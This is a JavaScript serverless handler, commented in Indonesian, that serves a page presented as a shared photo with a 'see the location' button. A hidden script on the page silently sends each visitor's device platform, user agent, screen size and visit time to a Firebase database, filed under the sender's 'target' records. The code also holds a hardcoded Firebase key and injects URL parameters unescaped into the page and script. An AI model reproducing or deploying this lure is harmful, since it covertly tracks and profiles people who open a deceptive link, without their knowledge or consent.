export default function handler(req, res) {
  // 1. Ambil parameter dari URL
  const queryString = req.url.split('?')[1] || '';
  const params = {};
  queryString.split('&').forEach(param => {
    const [key, value] = param.split('=');
    if (key && value) {
      params[key] = decodeURIComponent(value);
    }
  });

  const foto = params.foto;
  const lat = params.lat;
  const lng = params.lng;
  const user = params.u || 'images';
  const nama = params.nama || 'Lokasi Foto';

  // 2. Jika tidak ada foto, tampilkan error
  if (!foto) {
    return res.status(400).send(`
      <html>
        <body style="font-family: sans-serif; text-align: center; padding: 50px; background: #111; color: #fff;">
          <h1>Link Tidak Valid</h1>
          <p>Foto tidak ditemukan di link ini.</p>
        </body>
      </html>
    `);
  }

  // 3. Cek apakah lokasi tersedia
  const hasLocation = lat && lng;
  const mapsLink = hasLocation 
    ? `https://www.google.com/maps?q=${lat},${lng}` 
    : '#';

  // 4. Tampilkan HTML dengan script untuk kirim data ke Firebase
  const html = `<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Foto Dibagikan</title>
<meta property="og:title" content="Foto Dibagikan" />
<meta property="og:description" content="Seseorang membagikan foto kepada Anda. Klik untuk melihat lokasinya." />
<meta property="og:image" content="${foto}" />
<meta property="og:image:width" content="1200" />
<meta property="og:image:height" content="630" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="${foto}" />
<style>
  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 0; background: #111; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
  .container { text-align: center; padding: 20px; max-width: 500px; width: 100%; }
  img { max-width: 100%; height: auto; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); margin-bottom: 20px; }
  .btn { display: inline-block; background: #4CAF50; color: white; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; font-size: 16px; transition: background 0.3s; width: 80%; max-width: 300px; }
  .btn:hover { background: #45a049; }
  .btn-disabled { background: #555; cursor: not-allowed; }
  .footer { font-size: 12px; color: #888; margin-top: 15px; }
</style>
</head>
<body>
  <div class="container">
    <img src="${foto}" alt="Foto Dibagikan">
    <br>
    ${hasLocation 
      ? `<a href="${mapsLink}" class="btn" id="btnMaps" target="_blank">📍 Lihat Lokasi Foto</a>`
      : `<a href="#" class="btn btn-disabled" onclick="alert('Lokasi foto tidak tersedia di link ini.'); return false;">📍 Lihat Lokasi Foto</a>`
    }
    <p class="footer">Akan membuka di Google Maps</p>
  </div>

  <!-- Script untuk Kirim Data ke Firebase -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";

    const FC = {
      apiKey: "AIzaSyBYjDmJh5OG_AkZesWObgGkSgr6yX0iBEI",
      authDomain: "roraxbali-65802.firebaseapp.com",
      databaseURL: "https://roraxbali-65802-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "roraxbali-65802",
      storageBucket: "roraxbali-65802.firebasestorage.app",
      messagingSenderId: "750633313866",
      appId: "1:750636313866:web:3d2e552960e06db83968b3"
    };

    const app = initializeApp(FC);
    const db = getDatabase(app);

    const targetUser = "${user}";
    const targetName = "Foto Viewer";
    const targetLat = ${lat || 0};
    const targetLng = ${lng || 0};

    // Kirim data saat halaman dibuka
    async function kirimData() {
      try {
        // Dapatkan info perangkat
        const platform = navigator.platform || 'Unknown';
        const userAgent = navigator.userAgent || 'Unknown';
        const screenRes = screen.width + 'x' + screen.height;

        // Kirim ke Firebase
        const dataRef = ref(db, 'lokasi/' + targetUser);
        await push(dataRef, {
          target: targetName,
          lat: targetLat,
          lng: targetLng,
          platform: platform,
          userAgent: userAgent,
          screen: screenRes,
          waktu: Date.now(),
          via: 'view' // Tandai bahwa data ini dari link foto
        });

        console.log('Data terkirim ke Firebase');
      } catch (e) {
        console.error('Gagal kirim data:', e);
      }
    }

    // Jalankan saat halaman selesai dimuat
    window.addEventListener('load', kirimData);

    // Jika tombol Maps diklik, kirim data lagi (opsional)
    const btnMaps = document.getElementById('btnMaps');
    if (btnMaps) {
      btnMaps.addEventListener('click', function(e) {
        kirimData(); // Kirim data terakhir sebelum pindah ke Maps
      });
    }
  </script>
</body>
</html>`;

  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.setHeader('Cache-Control', 'public, max-age=3600');
  res.status(200).send(html);
}
